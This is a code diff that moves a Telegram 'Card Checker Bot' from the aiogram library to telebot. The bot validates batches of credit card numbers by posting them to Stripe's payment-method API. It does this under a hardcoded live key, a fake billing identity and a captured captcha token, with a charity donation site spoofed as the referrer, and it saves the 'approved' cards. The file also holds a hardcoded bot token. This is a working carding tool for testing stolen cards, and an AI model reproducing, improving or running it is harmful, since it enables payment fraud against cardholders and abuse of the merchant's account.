@@ -2,13 +2,10 @@ import os
 import json
 import time
 import requests
-import asyncio
+import threading
 from datetime import datetime
-from aiogram import Bot, Dispatcher, types, F
-from aiogram.enums import ParseMode
-from aiogram.filters import Command
-from aiogram.types import Message, FSInputFile
-from aiogram.client.default import DefaultBotProperties
+import telebot
+from telebot import types
 import logging
 
 # Enable logging
@@ -21,9 +18,8 @@ logger = logging.getLogger(__name__)
 # Bot token
 TOKEN = os.environ.get("BOT_TOKEN", "8307343077:AAGG7qRYwcN2fJ2Wig3kMpsT7605YEb-pgU")
 
-# Initialize bot and dispatcher
-bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
-dp = Dispatcher()
+# Initialize bot
+bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
 
 # Store user states and data
 user_sessions = {}
@@ -63,7 +59,7 @@ class CardChecker:
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
         }
 
-        data = f'type=card&billing_details[address][city]=Heathport&billing_details[address][country]=US&billing_details[address][line1]=60269+Cleora+Pine+Apt.+6&billing_details[address][line2]=Cuyahoga+County&billing_details[address][postal_code]=10010&billing_details[address][state]=NY&billing_details[email]=sbxdzrc%40hi2.in&billing_details[name]=Mr+Brooks+Rohan&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=bf93b5f4-8e77-402a-adb1-f608d324549cd581f0&muid=ef040de5-bf28-4cd2-b356-454489a1509d441557&sid=ce7bdf50-68fd-433c-93f7-436f1eb6e239983d2a&payment_user_agent=stripe.js%2F2b425ea933%3B+stripe-js-v3%2F2b425ea933%3B+split-card-element&referrer=https%3A%2F%2Fbreastcancerresearch.enthuse.com&time_on_page=126629&ke_live_ftYOjqGtfMkXICnngj1VQh99&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiUVZaWkg2UzBSTzFjUGJsV2RrdDZhdE80VGFiY29RQXZZUjY1ZzdzSXptTDdNVnJCMWpEK2VHakVSdHVGclkwRXNGWVFZYk9YbVhDZFUyd1pDNVNoalBObUl6b1ozL1VGVUVCMHZIZjNHQXVXYzdKK1NOMjRoS2x0bE1xTFRuQ1dmZ3NPWnVaMkcwMmdpMW1LV2NBMkhLenJRbkJkazVWOUNUVzREcThNc0hyWDNLZjJyK1Zzek5WeWRZVGVkOVpxMHZwSWNuc1d3L0NxaU9QaUp3cUQ1ZDNvVkdHYVRmOSs4ZjkzeWp4K3FFS0JVNzVpZU1LTkZhTndNRkExTSszZnltK1dkYnp4eGJUbFB5cFdwMks3UlVEMDFvalRHZm1uSHlJTGlFUm9yLzQwRVpGUTRwVlhKODNBT3Ryejk5bFl3TWxOdzdGT0IrSGEzTXU2QlkzMmdwN3RKa3NjdVdkZUVzd0QxRUtpY3F3TTZMT1poZm5mT1NvaEZyS3dlUkVNeHNadGhyMEt1Z3NUdTB1QjRVN2dOM2lGYjBTd2ZUSXJ5bEJLRlN0UU9DSmRHc0JIRm43R1phQzh0cXZZNDFaM3JDRnZxZ2orYlVlUU9qN3FoRXVTTE5ocWxoaHdzWGpFRkl4bitqYVo3MG9DbHo2ZS82TGlWeXVrVDZsb2VlOFk5ckp4R2dQUDU0ZTFvcUorSUlET0ZJeVNWNlIrdlRzdUxCYnc5VE93RHdVMDdpYzVCNnhneFAwS1cvdnE0cDFKMVFubEpSUCtubDFNc2dmdXVuaW5mK3N0dDBtZUtiRjhtRHRjOHBwSFl0YUJpd25qM3MxSzladmdwM0dLK0dBb0x4K25vdGZzTlNZakDUcGM0NWdoMDBmaDArTTlkd0FQbk9FT1RqY1VRZnp4bloxajlxeGtCaUtkQ2pLTHdkcnlEVUJYMjZFZmZKbDZ0WHpBMGk5M2k1VnJtbzNObThUbXh4VEhsemd5MSt5Q0ZoV0xlSGx5YlFOU2hIUGxNWjloWkEzQWY0Y1pLZlVCd3hpWFdCRnkweVI2V2JCMjFHRlNsS285WXo1dEdwZm1YaUt3cEs3VjFiSTZ3VERaQjUwTTZXSDlpbDNpTHNVeWdiK1ZmSTI5cFc2eXpRVTZ1bko0SzFhUGd6aDdZT0dQTk9PUUNENmZna2d1MktPRCtWTVM5cjF6RTNKMXp2TDBLZHl2R1lGem9tNGFFM1Fwa3FvZUFvTHJZMDd1ZnE3Y25DZ2NhQVcrVWcwMHpnc3B2NmVOcGRVUTIyNFZHbUhoc1lnTlZIeVZiQmlTZktheXY0RytRb3ZCcEVKVlAvVnF0MHRxZnVJUTR4OWNaTzArR2lnY1FJN2p0UHhaVCtYeXlEWEF1RUxTekZLc1o5eEZrS21VRzBlTUdzWk9oZUVYZ1VQV1RXRit2YUNXUS9BdytlYU0yYWVjOFFQeEN1OXd0VWd3NG44UnJIcjNWQ0RNaWFuOVVZallJUVdzS2ZpRFZGQmdSckVGdkhlQUhGckc0cmJheGQ3T0IxeUNKc2xkVGx4Rm5GMHdpU2JReHlxNlB3VGc2RSt4Y3djWDhIRW9MWlVibjlVVk5OWnN3N043WUZPMDQ5d3lLRzN3bnhRd0tnSHd6MW1aVEc0amxZNGV3ZG9FQXVRY01vMVc1ZVZBczR5a3MvSlBwcElCa2NIV1BNTmF0RTVpazVWYXZ2YUF2bWRKaHh3NXIzd2VxV3YrRm5EUW5DZUd5cUhxSFU4d0ZuZXdKZVhNOVJ1ZktRMnpkT1dqM0Z3aTRodGZMZWVOUHdUTWxnR0YvL2l5YXpHbzBveDJib2lVVXZZM2U2WkxJV1I1WHdtcnN1VWh3cVlTMnVtazY2T2YwL1grUHp2S21zNXVyMk5EZk05cmdRZjhVdWhKZjViNXF2NXRGRE5jWFFpUUsvSzI2S20yV0tETHZxR21ZNUpiS0Z1K3A4VE9DZWV3eFA1QnRFUHNHb1FGRU8xMVc3VHc5bWc4S0RYbUd0NTMrOHExQnZJWUlhbGNLeU80Z05pZ3U3M0dBUDFGai9QTGZjWWFGMXJpQjRtNVNtTzdJalBpNWsrcXZCMWVzc1dGVCttUENyVSt4ZGJNUW5MOWZadzdLdDdyTnlCd3JKdXIrWTdacHhLakdJSEdQc045TTJyWUJ0WHlTYU1MRGNqeld5Tmd0ck84Y3NyVXg5SHZXVEVPMExwZXNTd3hmek94RzZoYytOdFdFM1d2NzFETXZNUUJ2dTJUdENYWVdYRVgrS0FtaTRnMGw2d3V1OXRFM1FySVJtWWE5R0wwNkpacDg5QkpmOW5BU3ozaXFZOGJ4bEN0Ly9ESGg8NHV0SFVtcXNUdXBDQ2wycGN4d1dvRHR3bkdVNm5YQjJVNEF3MHg5T2t2NFh4dDFzSFZQMDNUWVExa2hxMzFYQVdJaUMvK21TUHh5TWpoOEVNdzA4UUlQeTdwOTVVZEZBNmI3UW9qZXRjZ2pPMHBPdXZJNkZUSitYYWJZTnhCYzVQYVMwU01tQ1RjbE1zQ0pFWHlWeHZ0QmxvUzVaSURsbXAvNDBoSG5CUmR5S3NZNXRsUzFWVHdHbzVLYWJzU2F4TFhEcUJCREx1RDY2RlZvVy9TQmRIaVBlNFRzdFdJTHV6NHorOWN1SWhWS3NqdzVLNW90d1ZxQThyUXl1dW9sQUYxb0gvUURrWkZISzJzRFQ4YzBWQ2FnR2hqQUtOZHd4NW9jWTlEVmVXSnVjajJ2amtYNXlreGVLTEVNRzJaRzI0PSIsImV4cCI6MTc0NzU1NTI3MCwic2hhcmRfaWQiOjI1OTE4OTM1OSwia3IiOiI1MDEzNmI3IiwicGQiOjAsImNkYXRhIjoiUmpYZCtPSW9wUllhcy8yUVdzL2REUDMxWFdCYW93cTZrVVR0QlpkWUtBUUpneEdMOC9FbFRzZnZQbjgyQWp0ZTRyT3MvTG9QMzFGbW95QVRJOW8zelVwZ1BWdHNmSVhDWXJhODVQY2dpbTVIWTk2cGJuZG15a3BWc3Z4TEF5Wi9UWEJ0MnhyUnJKS3lUS29BRUM4Z3VmOTBkRVhyWVZuU3VFZXkzQmJtSHuGUkZ5OHM4ajRLejBQS2hSbnhrUHM4T1YwdjhQU0tYZUVUdHVJUSJ9.tkvFUaCs7qALz6IT2SyEmcqtr5cI0OMz6LAZuy2lwIg'
+        data = f'type=card&billing_details[address][city]=Heathport&billing_details[address][country]=US&billing_details[address][line1]=60269+Cleora+Pine+Apt.+6&billing_details[address][line2]=Cuyahoga+County&billing_details[address][postal_code]=10010&billing_details[address][state]=NY&billing_details[email]=sbxdzrc%40hi2.in&billing_details[name]=Mr+Brooks+Rohan&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=bf93b5f4-8e77-402a-adb1-f608d324549cd581f0&muid=ef040de5-bf28-4cd2-b356-454489a1509d441557&sid=ce7bdf50-68fd-433c-93f7-436f1eb6e239983d2a&payment_user_agent=stripe.js%2F2b425ea933%3B+stripe-js-v3%2F2b425ea933%3B+split-card-element&referrer=https%3A%2F%2Fbreastcancerresearch.enthuse.com&time_on_page=126629&ke_live_ftYOjqGtfMkXICnngj1VQh99&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiUVZaWkg2UzBSTzFjUGJsV2RrdDZhdE80VGFiY29RQXZZUjY1ZzdzSXptTDdNVnJCMWpEK2VHakVSdHVGclkwRXNGWVFZYk9YbVhDZFUyd1pDNVNoalBObUl6b1ozL1VGVUVCMHZIZjNHQXVXYzdKK1NOMjRoS2x0bE1xTFRuQ1dmZ3NPWnVaMkcwMmdpMW1LV2NBMkhLenJRbkJkazVWOUNUVzREcThNc0hyWDNLZjJyK1Zzek5WeWRZVGVkOVpxMHZwSWNuc1d3L0NxaU9QaUp3cUQ1ZDNvVkdHYVRmOSs4ZjkzeWp4K3FFS0JVNzVpZU1LTkZhTndNRkExTSszZnltK1dkYnp4eGJUbFB5cFdwMks3UlVEMDFvalRHZm1uSHlJTGlFUm9yLzQwRVpGUTRwVlhKODNBT3Ryejk5bFl3TWxOdzdGT0IrSGEzTXU2QlkzMmdwN3RKa3NjdVdkZUVzd0QxRUtpY3F3TTZMT1poZm5mT1NvaEZyS3dlUkVNeHNadGhyMEt1Z3NUdTB1QjRVN2dOM2lGYjBTd2ZUSXJ5bEJLRlN0UU9DSmRHc0JIRm43R1phQzh0cXZZNDFaM3JDRnZxZ2orYlVlUU9qN3FoRXVTTE5ocWxoaHdzWGpFRkl4bitqYVo3MG9DbHo2ZS82TGlWeXVrVDZsb2VlOFk5ckp4R2dQUDU0ZTFvcUorSUlET0ZJeVNWNlIrdlRzdUxCYnc5VE93RHdVMDdpYzVCNnhneFAwS1cvdnE0cDFKMVFubEpSUCtubDFNc2dmdXVuaW5mK3N0dDBtZUtiRjhtRHRjOHBwSFl0YUJpd25qM3MxSzladmdwM0dLK0dBb0x4K25vdGZzTlNZakDUcGM0NWdoMDBmaDArTTlkd0FQbk9FT1RqY1VRZnp4bloxajlxeGtCaUtkQ2pLTHdkcnlEVUJYMjZFZmZKbDZ0WHpBMGk5M2k1VnJtbzNObThUbXh4VEhsemd5MSt5Q0ZoV0xlSGx5YlFOU2hIUGxNWjloWkEzQWY0Y1pLZlVCd3hpWFdCRnkweVI2V2JCMjFHRlNsS285WXo1dEdwZm1YaUt3cEs3VjFiSTZ3VERaQjUwTTZXSDlpbDNpTHNVeWdiK1ZmSTI5cFc2eXpRVTZ1bko0SzFhUGd6aDdZT0dQTk9PUUNENmZna2d1MktPRCtWTVM5cjF6RTNKMXp2TDBLZHl2R1lGem9tNGFFM3Fwa3FvZUFvTHJZMDd1ZnE3Y25DZ2NhQVcrVWcwMHpnc3B2NmVOcGRVUTIyNFZHbUhoc1lnTlZIeVZiQmlTZktheXY0RytRb3ZCcEVKVlAvVnF0MHRxZnVJUTR4OWNaTzArR2lnY1FJN2p0UHhaVCtYeXlEWEF1RUxTekZLc1o5eEZrS21VRzBlTUdzWk9oZUVYZ1VQV1RXRit2YUNXUS9BdytlYU0yYWVjOFFQeEN1OXd0VWd3NG44UnJIcjNWQ0RNaWFuOVVZallJUVdzS2ZpRFZGQmdSckVGdkhlQUhGckc0cmJheGQ3T0IxeUNKc2xkVGx4Rm5GMHdpU2JReHlxNlB3VGc2RSt4Y3djWDhIRW9MWlVibjlVVk5OWnN3N043WUZPMDQ9d3lLRzN3bnhRd0tnSHd6MW1aVEc0amxZNGV3ZG9FQXVRY01vMVc1ZVZBczR5a3MvSlBwcElCa2NIV1BNTmF0RTVpazVWYXZ2YUF2bWRKaHh3NXIzd2VxV3YrRm5EUW5DZUd5cUhxSFU4d0ZuZXdKZVhNOVJ1ZktRMnpkT1dqM0Z3aTRodGZMZWVOUHdUTWxnR0YvL2l5YXpHbzBveDJib2lVVXZZM2U2WkxJV1I1WHdtcnN1VWh3cVlTMnVtazY2T2YwL1grUHp2S21zNXVyMk5EZk05cmdRZjhVdWhKZjViNXF2NXRGRE5jWFFpUUsvSzI2S20yV0tETHZxR21ZNUpiS0Z1K3A4VE9DZWV3eFA1QnRFUHNHb1FGRU8xMVc3VHc5bWc4S0RYbUd0NTMrOHExQnZJWUlhbGNLeU80Z05pZ3U3M0dBUDFGai9QTGZjWWFGMXJpQjRtNVNtTzdJalBpNWsrcXZCMWVzc1dGVCttUENyVSt4ZGJNUW5MOWZadzdLdDdyTnlCd3JKdXIrWTdacHhLakdJSEdQc045TTJyWUJ0WHlTYU1MRGNqeld5Tmd0ck84Y3NyVXg5SHZXVEVPMExwZXNTd3hmek94RzZoYytOdFdFM1d2NzFETXZNUUJ2dTJUdENYWVdYRVgrS0FtaTRnMGw2d3V1OXRFM3FySVJtWWE5R0wwNkpacDg5QkpmOW5BU3ozaXFZOGJ4bEN0Ly9ESGg8NHV0SFVtcXNUdXBDQ2wycGN4d1dvRHR3bkdVNm5YQjJVNEF3MHg5T2t2NFh4dDFzSFZQMDNUWVExa2hxMzFYQVdJaUMvK21TUHh5TWpoOEVNdzA4UUlQeTdwOTVVZEZBNmI3UW9qZXRjZ2pPMHBPdXZJNkZUSitYYWJZTnhCYzVQYVMwU01tQ1RjbE1zQ0pFWHlWeHZ0QmxvUzVaSURsbXAvNDBoSG5CUmR5S3NZNXRsUzFWVHdHbzVLYWJzU2F4TFhEcUJCREx1RDY2RlZvVy9TQmRIaVBlNFRzdFdJTHV6NHorOWN1SWhWS3NqdzVLNW90d1ZxQThyUXl1dW9sQUYxb0gvUURrWkZISzJzRFQ4YzBWQ2FnR2hqQUtOZHd4NW9jWTlEVmVXSnVjajJ2amtYNXlreGVLTEVNRzJaRzI0PSIsImV4cCI6MTc0NzU1NTI3MCwic2hhcmRfaWQiOjI1OTE4OTM1OSwia3IiOiI1MDEzNmI3IiwicGQiOjAsImNkYXRhIjoiUmpYZCtPSW9wUllhcy8yUVdzL2REUDMxWFdCYW93cTZrVVR0QlpkWUtBUUpneEdMOC9FbFRzZnZQbjgyQWp0ZTRyT3S/LG9QMzFGbW95QVRJOW8zelVwZ1BWdHNmSVhDWXJhODVQY2dpbTVIWTk2cGJuZG15a3BWc3Z4TEF5Wi9UWEJ0MnhyUnJKS3lUS29BRUM4Z3VmOTBkRVhyWVZuU3VFZXkzQmJtSHuGUkZ5OHM4ajRLejBQS2hSbnhrUHM4T1YwdjhQU0tYZUVUdHVJUSJ9.tkvFUaCs7qALz6IT2SyEmcqtr5cI0OMz6LAZuy2lwIg'
 
         try:
             response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=30)
@@ -160,89 +156,116 @@ class CardChecker:
         
         return f"❌ Unknown error for: {ccx}"
     
-    async def start_checking(self, cards):
-        """Start checking cards"""
+    def start_checking(self, cards):
+        """Start checking cards in a separate thread"""
         self.running = True
         self.start_time = datetime.now()
         self.total_checked = 0
         self.approved_count = 0
         self.approved_cards = []
         
-        status_message = await bot.send_message(
-            chat_id=self.user_id,
-            text="🔄 Starting card checker...\n⏳ Please wait..."
-        )
-        
-        approved_file = f"approved_{self.user_id}_{int(time.time())}.txt"
-        
-        for card in cards:
-            if not self.running:
-                break
+        def checking_thread():
+            try:
+                status_message = None
                 
-            self.current_card = card
-            self.total_checked += 1
-            
-            # Update status every 5 cards
-            if self.total_checked % 5 == 0:
-                elapsed = datetime.now() - self.start_time
-                await status_message.edit_text(
-                    f"📊 <b>Checker Status</b>\n"
-                    f"✅ Approved: {self.approved_count}\n"
-                    f"📋 Total Checked: {self.total_checked}\n"
-                    f"⏰ Elapsed: {elapsed.seconds // 60}m {elapsed.seconds % 60}s\n"
-                    f"🔄 Checking: {card[:20]}..."
+                # Send initial status
+                status_message = bot.send_message(
+                    self.user_id,
+                    "🔄 Starting card checker...\n⏳ Please wait..."
                 )
-            
-            result = self.check_card(card)
-            
-            # Send individual result
-            await bot.send_message(
-                chat_id=self.user_id,
-                text=result
-            )
-            
-            # Check if approved
-            if "✅" in result:
-                self.approved_count += 1
-                self.approved_cards.append(f"{card} | {result}")
                 
-                # Save to file
-                with open(approved_file, 'a') as f:
-                    f.write(f"{card} | {result}\n")
-            
-            # Delay between checks
-            await asyncio.sleep(5)
+                approved_file = f"approved_{self.user_id}_{int(time.time())}.txt"
+                
+                for i, card in enumerate(cards):
+                    if not self.running:
+                        break
+                        
+                    self.current_card = card
+                    self.total_checked += 1
+                    
+                    # Update status every 5 cards
+                    if self.total_checked % 5 == 0:
+                        elapsed = datetime.now() - self.start_time
+                        status_text = (
+                            f"📊 <b>Checker Status</b>\n"
+                            f"✅ Approved: {self.approved_count}\n"
+                            f"📋 Total Checked: {self.total_checked}\n"
+                            f"⏰ Elapsed: {elapsed.seconds // 60}m {elapsed.seconds % 60}s\n"
+                            f"🔄 Checking: {card[:20]}..."
+                        )
+                        try:
+                            bot.edit_message_text(
+                                status_text,
+                                chat_id=self.user_id,
+                                message_id=status_message.message_id
+                            )
+                        except:
+                            status_message = bot.send_message(
+                                self.user_id,
+                                status_text
+                            )
+                    
+                    result = self.check_card(card)
+                    
+                    # Send individual result
+                    bot.send_message(
+                        self.user_id,
+                        result
+                    )
+                    
+                    # Check if approved
+                    if "✅" in result:
+                        self.approved_count += 1
+                        self.approved_cards.append(f"{card} | {result}")
+                        
+                        # Save to file
+                        with open(approved_file, 'a') as f:
+                            f.write(f"{card} | {result}\n")
+                    
+                    # Delay between checks
+                    time.sleep(5)
+                
+                # Send final results
+                elapsed = datetime.now() - self.start_time
+                final_message = (
+                    f"🏁 <b>Checker Completed!</b>\n\n"
+                    f"📊 <b>Results:</b>\n"
+                    f"✅ Approved: {self.approved_count}\n"
+                    f"❌ Declined: {self.total_checked - self.approved_count}\n"
+                    f"📋 Total Checked: {self.total_checked}\n"
+                    f"⏰ Time Taken: {elapsed.seconds // 60}m {elapsed.seconds % 60}s\n\n"
+                )
+                
+                if self.approved_cards:
+                    final_message += f"📁 Approved cards saved to: <code>{approved_file}</code>\n\n"
+                    final_message += "<b>Approved Cards:</b>\n"
+                    for approved_card in self.approved_cards[-5:]:
+                        final_message += f"• {approved_card[:50]}...\n"
+                
+                bot.send_message(
+                    self.user_id,
+                    final_message
+                )
+                
+            except Exception as e:
+                bot.send_message(
+                    self.user_id,
+                    f"❌ Error in checking thread: {str(e)}"
+                )
+            finally:
+                self.running = False
         
-        # Send final results
-        elapsed = datetime.now() - self.start_time
-        final_message = (
-            f"🏁 <b>Checker Completed!</b>\n\n"
-            f"📊 <b>Results:</b>\n"
-            f"✅ Approved: {self.approved_count}\n"
-            f"❌ Declined: {self.total_checked - self.approved_count}\n"
-            f"📋 Total Checked: {self.total_checked}\n"
-            f"⏰ Time Taken: {elapsed.seconds // 60}m {elapsed.seconds % 60}s\n\n"
-        )
-        
-        if self.approved_cards:
-            final_message += f"📁 Approved cards saved to: <code>{approved_file}</code>\n\n"
-            final_message += "<b>Approved Cards:</b>\n"
-            for approved_card in self.approved_cards[-5:]:
-                final_message += f"• {approved_card[:50]}...\n"
-        
-        await bot.send_message(
-            chat_id=self.user_id,
-            text=final_message
-        )
-        
-        self.running = False
+        # Start checking in a separate thread
+        thread = threading.Thread(target=checking_thread)
+        thread.daemon = True
+        thread.start()
         
     def stop(self):
         """Stop the checker"""
         self.running = False
 
-@dp.message(Command("start"))
-async def start_command(message: Message):
+@bot.message_handler(commands=['start'])
+def start_command(message):
     """Send a welcome message when the command /start is issued."""
     welcome_text = f"""
 👋 Welcome {message.from_user.first_name} to the Card Checker Bot!
@@ -262,10 +285,10 @@ async def start_command(message: Message):
 ⚠️ <b>Note:</b> Use this bot responsibly and legally.
     """
     
-    await message.answer(welcome_text)
+    bot.reply_to(message, welcome_text)
 
-@dp.message(Command("help"))
-async def help_command(message: Message):
+@bot.message_handler(commands=['help'])
+def help_command(message):
     """Send help message."""
     help_text = """
 🆘 <b>Help Guide</b>
@@ -298,17 +321,18 @@ async def help_command(message: Message):
 </code>
     """
     
-    await message.answer(help_text)
+    bot.reply_to(message, help_text)
 
-@dp.message(Command("check"))
-async def check_card_command(message: Message):
+@bot.message_handler(commands=['check'])
+def check_card_command(message):
     """Check a single card."""
     user_id = message.from_user.id
     
     # Get card from command arguments
     args = message.text.split()[1:] if len(message.text.split()) > 1 else []
     if not args:
-        await message.answer(
+        bot.reply_to(
+            message,
             "❌ Please provide a card in format:\n"
             "<code>/check 1234567890123456|12|34|567</code>"
         )
@@ -316,7 +340,8 @@ async def check_card_command(message: Message):
     
     card = ' '.join(args).strip()
     
-    await message.answer(
+    bot.reply_to(
+        message,
         f"🔄 Checking card: <code>{card[:20]}...</code>\n"
         "⏳ Please wait..."
     )
@@ -324,21 +349,23 @@ async def check_card_command(message: Message):
     checker = CardChecker(user_id)
     result = checker.check_card(card)
     
-    await message.answer(result)
+    bot.send_message(user_id, result)
 
-@dp.message(Command("check_file"))
-async def check_file_command(message: Message):
+@bot.message_handler(commands=['check_file'])
+def check_file_command(message):
     """Handle file upload for checking."""
     user_id = message.from_user.id
     
     if user_id in active_checkers and active_checkers[user_id].running:
-        await message.answer(
+        bot.reply_to(
+            message,
             "⚠️ You already have an active checker running!\n"
             "Use /stop to stop it first."
         )
         return
     
-    await message.answer(
+    bot.reply_to(
+        message,
         "📤 Please upload a .txt file with cards.\n"
         "Each line should contain one card in format:\n"
         "<code>card_number|mm|yy|cvv</code>"
@@ -346,8 +373,8 @@ async def check_file_command(message: Message):
     
     user_sessions[user_id] = 'waiting_for_file'
 
-@dp.message(F.document)
-async def handle_document(message: Message):
+@bot.message_handler(content_types=['document'])
+def handle_document(message):
     """Handle uploaded document."""
     user_id = message.from_user.id
     
@@ -357,15 +384,19 @@ async def handle_document(message: Message):
     document = message.document
     
     if not document.file_name.endswith('.txt'):
-        await message.answer("❌ Please upload a .txt file!")
+        bot.reply_to(message, "❌ Please upload a .txt file!")
         del user_sessions[user_id]
         return
     
-    await message.answer("📥 Downloading file...")
+    bot.reply_to(message, "📥 Downloading file...")
     
     # Download the file
+    file_info = bot.get_file(document.file_id)
+    downloaded_file = bot.download_file(file_info.file_path)
     file_path = f"cards_{user_id}.txt"
-    await bot.download(document, destination=file_path)
+    
+    with open(file_path, 'wb') as new_file:
+        new_file.write(downloaded_file)
     
     # Read cards from file
     try:
@@ -373,12 +404,13 @@ async def handle_document(message: Message):
             cards = [line.strip() for line in f if line.strip()]
         
         if not cards:
-            await message.answer("❌ File is empty!")
+            bot.reply_to(message, "❌ File is empty!")
             del user_sessions[user_id]
             os.remove(file_path)
             return
         
-        await message.answer(
+        bot.reply_to(
+            message,
             f"📋 Found {len(cards)} cards in file.\n"
             "🔄 Starting checker...\n"
             "⏳ This may take a while..."
@@ -388,29 +420,29 @@ async def handle_document(message: Message):
         checker = CardChecker(user_id)
         active_checkers[user_id] = checker
         
-        # Start checking in background
-        asyncio.create_task(checker.start_checking(cards))
+        # Start checking
+        checker.start_checking(cards)
         
     except Exception as e:
-        await message.answer(f"❌ Error reading file: {str(e)}")
+        bot.reply_to(message, f"❌ Error reading file: {str(e)}")
     finally:
         del user_sessions[user_id]
         if os.path.exists(file_path):
             os.remove(file_path)
 
-@dp.message(Command("status"))
-async def status_command(message: Message):
+@bot.message_handler(commands=['status'])
+def status_command(message):
     """Show current checker status."""
     user_id = message.from_user.id
     
     if user_id not in active_checkers:
-        await message.answer("ℹ️ No active checker running.")
+        bot.reply_to(message, "ℹ️ No active checker running.")
         return
     
     checker = active_checkers[user_id]
     
     if not checker.running:
-        await message.answer("ℹ️ Checker is not currently running.")
+        bot.reply_to(message, "ℹ️ Checker is not currently running.")
         return
     
     elapsed = datetime.now() - checker.start_time
@@ -425,22 +457,23 @@ async def status_command(message: Message):
     if checker.current_card:
         status_text += f"\n🔄 Currently checking:\n<code>{checker.current_card}</code>"
     
-    await message.answer(status_text)
+    bot.reply_to(message, status_text)
 
-@dp.message(Command("stop"))
-async def stop_checker_command(message: Message):
+@bot.message_handler(commands=['stop'])
+def stop_checker_command(message):
     """Stop the current checker."""
     user_id = message.from_user.id
     
     if user_id not in active_checkers:
-        await message.answer("ℹ️ No active checker to stop.")
+        bot.reply_to(message, "ℹ️ No active checker to stop.")
         return
     
     checker = active_checkers[user_id]
     
     if checker.running:
         checker.stop()
-        await message.answer(
+        bot.reply_to(
+            message,
             f"🛑 Checker stopped!\n\n"
             f"📊 Final Results:\n"
             f"✅ Approved: {checker.approved_count}\n"
@@ -448,15 +481,16 @@ async def stop_checker_command(message: Message):
         )
         del active_checkers[user_id]
     else:
-        await message.answer("ℹ️ Checker is not currently running.")
+        bot.reply_to(message, "ℹ️ Checker is not currently running.")
 
-@dp.message(Command("stats"))
-async def stats_command(message: Message):
+@bot.message_handler(commands=['stats'])
+def stats_command(message):
     """Show user statistics."""
     user_id = message.from_user.id
     
     if user_id not in active_checkers:
-        await message.answer(
+        bot.reply_to(
+            message,
             "📊 <b>Statistics</b>\n\n"
             "No checking sessions found yet.\n"
             "Use /check or /check_file to start checking cards."
@@ -475,15 +509,9 @@ async def stats_command(message: Message):
     if checker.approved_cards:
         stats_text += f"\n📁 Last approved file saved\n"
     
-    await message.answer(stats_text)
-
-async def main():
-    """Start the bot."""
-    logger.info("🤖 Bot is starting...")
-    me = await bot.get_me()
-    logger.info(f"🔗 Link: https://t.me/{me.username}")
-    
-    await dp.start_polling(bot)
+    bot.reply_to(message, stats_text)
 
 if __name__ == '__main__':
-    asyncio.run(main())
+    logger.info("🤖 Bot is starting...")
+    logger.info("📡 Polling for messages...")
+    bot.infinity_polling()
